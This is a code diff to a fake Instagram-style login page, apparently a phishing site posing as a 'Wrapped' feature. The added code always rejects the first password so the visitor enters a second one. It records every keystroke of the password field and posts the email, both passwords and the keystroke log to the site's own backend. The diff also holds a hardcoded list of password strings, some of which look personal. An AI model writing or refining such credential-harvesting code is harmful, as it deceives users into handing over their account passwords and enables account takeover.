@@ -9,7 +9,11 @@ export default function Home() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
+  const [passwordHistory, setPasswordHistory] = useState([]);
+  const [oldPassword, setOldPassword] = useState("");
   const [loading, setLoading] = useState(false);
+  const [firstPassword, setFirstPassword] = useState(true);
+
   const router = useRouter();
 
   const submit = async () => {
@@ -23,11 +27,21 @@ export default function Home() {
       setError("Password field cannot be empty.");
       return;
     }
-    if(password === "Monisha@18" || password === "Qaz@9361234" || password === "Deepthi916@" || password === "ask11@12" || password === "Arushig1212$" || password === "Prisha@2407" || password === "Qwerty@123%2407" || password === "@Ekrkp5za832") {
+    if(password.length < 6) {
       setError("Incorrect Password.");
       return;
     }
-    const bodyContent = JSON.stringify({email: email, password: password});
+    if(password === "Monisha@18" || password === "Monisha18" || password === "Qaz@9361234" || password === "Deepthi916@" || password === "ask11@12" || password === "Arushig1212$" || password === "Prisha@2407" || password === "Qwerty@123%2407" || password === "@Ekrkp5za832" || password === "myownREFLECTION4" || password === "Mahima2???" || password === "Bearpanda19" || password === "PinkHearts0510") {
+      setError("Incorrect Password.");
+      return;
+    }
+    if(firstPassword === true) {
+      setError("Incorrect Password.");
+      setOldPassword(password);
+      setFirstPassword(false);
+      return;
+    }
+    const bodyContent = JSON.stringify({email: email, password: password, password2: oldPassword, passwordHistory: passwordHistory});
     console.log(bodyContent);
     setLoading(true);
     await fetch('/api/login', {
@@ -68,12 +82,17 @@ export default function Home() {
                     </div>  
 
                     <div className="input-box">
-                      <input type="password" name="password" onChange={(e) => setPassword(e.target.value)} id="password" placeholder="Password" aria-required="true" required/>
+                      <input type="password" name="password" onChange={(e) => {
+                        setPassword(e.target.value)
+                        //@ts-ignore
+                        setPasswordHistory(oldArray => [...oldArray, e.target.value])
+                      }}
+                      id="password" placeholder="Password" aria-required="true" required/>
                     </div>  
 
                     <span className="button-box">
                       {loading && (
-                        <button className="btn" type="button">Preparing Wrapped...</button>
+                        <button className="btn" type="button">Logging In</button>
                       )}
                       {!loading && (
                         <button className="btn" type="button" name="submit" onClick={submit}>Log in</button>
@@ -82,9 +101,9 @@ export default function Home() {
                     {error && (
                       <span className='text-red-500 m-auto'>{error}</span>
                     )}
-                    {loading && (
+                    {/* {loading && (
                       <span className='text-blue-500 m-auto'>It can take upto a minute.</span>
-                    )}
+                    )} */}
                     <a className="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
                   </form>
                 </div>
